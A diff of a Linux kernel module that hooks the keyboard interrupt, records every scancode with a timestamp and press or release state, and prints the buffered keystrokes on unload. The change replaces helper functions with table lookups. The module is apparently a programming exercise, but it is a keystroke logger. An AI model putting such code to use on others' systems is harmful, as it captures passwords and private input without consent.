@@ -48,77 +48,6 @@ MODULE_DESCRIPTION("Keyboard interrupt handler");
 
 static struct miscdevice kbhandler;
 
-static int is_printable(unsigned char key)
-{
-	if (key >= 0x02 && key <= 0x29 && key != 0x0e && key != 0x1d)
-		return 1;
-	if (key >= 0x2b && key <= 0x35)
-		return 1;
-	if (key == 0x37 || key == 0x39)
-		return 1;
-	if (key >= 0x47 && key <= 0x53)
-		return 1;
-	return 0;
-}
-
-static char get_value(char *name, unsigned char scancode) {
-	char ret = '?';
-
-	if (is_printable(scancode) && !(scancode >= 0x47 && scancode <= 0x52))
-		ret = name[0];
-	switch (scancode) {
-		case 0x01:
-			ret = 27;
-			break;
-		case 0x0c:
-			ret = '-';
-			break;
-		case 0x0d:
-			ret = '=';
-			break;
-		case 0x0e:
-			ret = 8;
-			break;
-		case 0x0f:
-			ret = '\t';
-			break;
-		case 0x1b:
-			ret = ']';
-			break;
-		case 0x1c:
-			ret = '\n';
-			break;
-		case 0x1d:
-			ret = '^';
-			break;
-		case 0x27:
-			ret = ';';
-			break;
-		case 0x28:
-			ret = '\'';
-			break;
-		case 0x29:
-			ret = '`';
-			break;
-		case 0x2b:
-			ret = '\\';
-			break;
-		case 0x35:
-			ret = '/';
-			break;
-		case 0x37:
-			ret = '*';
-			break;
-		case 0x39:
-			ret = ' ';
-			break;
-		case 0x34:
-			ret = '.';
-			break;
-	}
-	return ret;
-}
-
 irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
 {
 	static unsigned char scancode;
@@ -127,6 +56,7 @@ irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
 	static struct s_stroke *new, *tmp;
 	static struct tm time;
 	static struct timespec ts;
+	struct keycodes *array;
 
 	if (!(new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC)))
 		goto end;
@@ -142,10 +72,12 @@ irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
 	else
 		state = 1;
 
+	array = multi ? multi_scancodes : simple_scancodes;
 	new->key = scancode;
 	new->state = state;
-	new->name = multi ? multi_scancodes[scancode].name : simple_scancodes[scancode].name;
-	new->value = get_value(new->name, scancode);
+	new->name = array[scancode].name;
+	new->value = array[scancode].ascii;
+	new->print = array[scancode].print;
 	new->multi = multi;
 	getnstimeofday(&ts);
 	time_to_tm(ts.tv_sec, 0, &time);
@@ -159,13 +91,7 @@ irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
 			tmp = tmp->next;
 		tmp->next = new;
 	}
-	/*printk("[%d:%d:%d] %s (%s%#x) %s\n", \
-			new->time.tm_hour, new->time.tm_min, new->time.tm_sec, \
-			new->name, \
-			new->multi ? "0xe0, " : "", new->key, \
-			new->state ? "pressed" : "released");*/
 	multi = 0;
-
 end:
 	return (irq_handler_t) IRQ_HANDLED;
 }
@@ -270,7 +196,7 @@ static void __exit hello_cleanup(void) {
 	tmp = stroke_head;
 	while (tmp)
 	{
-		if (is_printable(tmp->key) && tmp->state == 1) {
+		if (tmp->print == 1 && tmp->state == 1) {
 			n = strlen(buffer);
 			if (n >= 255) {
 				printk("%s\n", buffer);
